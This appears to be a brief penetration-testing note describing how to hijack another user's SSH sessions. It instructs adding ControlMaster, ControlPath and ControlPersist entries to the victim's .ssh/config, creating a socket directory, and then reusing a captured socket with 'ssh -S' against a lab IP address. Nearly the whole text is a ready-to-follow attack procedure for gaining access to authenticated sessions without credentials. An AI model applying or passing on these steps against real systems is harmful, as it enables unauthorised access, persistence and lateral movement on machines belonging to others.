This attack can create an attack vector where originally, there wasn't one.

Steps:
1st Add this text to the .ssh/config file of the user you want to hijack SSH sessions:
Host *
        ControlPath ~/.ssh/controlmaster/%r@%h:%p
        ControlMaster auto
        ControlPersist 10m

2nd chmod 644 .ssh/config

3rd mkdir .ssh/controlmaster   -> under this directory it will apear all the SSH sessions available for hijacking

4th ssh -S .ssh/controlmaster/trike@172.12.1.1\:22   -> lab example of how to use an SSH socket
